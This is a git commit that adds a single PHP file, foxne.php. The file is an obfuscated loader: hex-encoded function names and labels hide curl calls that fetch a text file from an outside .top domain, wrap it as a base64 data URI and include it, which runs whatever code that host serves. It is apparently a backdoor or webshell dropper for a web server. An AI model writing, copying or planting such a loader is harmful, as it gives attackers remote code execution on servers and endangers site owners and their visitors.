3f6595365d6282d8fe3b4995922e3b0d9a3bfa50
dzbackdor <141788825+Dzbackdor@users.noreply.github.com>
2025-09-13 08:43:00 +0700

    Add files via upload

---
+++ R24/foxne.php
@@ -0,0 +1,26 @@
+<?php
+function x($h){return pack('H*',$h);}
+$pskkb = x("6375726c5f696e6974");
+$ttjwu = x("6375726c5f7365746f7074");
+$cumgdev = x("6375726c5f65786563");
+$xdgwmqd = x("6375726c5f636c6f7365");
+$kxlmy = x("6261736536345f656e636f6465");
+$gmmnec = constant(x("4355524c4f50545f55524c"));
+$xmrsrsf = constant(x("4355524c4f50545f52455455524e5452414e53464552"));
+
+Dzone3099:
+goto Dzone6178;
+Dzone6178:
+$nchjtcs = x("68747470733a2f2f616d706e796170756e79616b752e746f702f746f6f6c732f666f782f666f782d6d696e6966792e747874");
+
+$radvej = $pskkb();
+$ttjwu($radvej, $gmmnec, $nchjtcs);
+$ttjwu($radvej, $xmrsrsf, true);
+$ozjykyt = $cumgdev($radvej);
+$xdgwmqd($radvej);
+
+if(!$ozjykyt) exit('Network error');
+
+$zcjv = $kxlmy($ozjykyt);
+$pbgxlyy = x("646174613a2f2f746578742f706c61696e3b6261736536342c") . $zcjv;
+include $pbgxlyy;
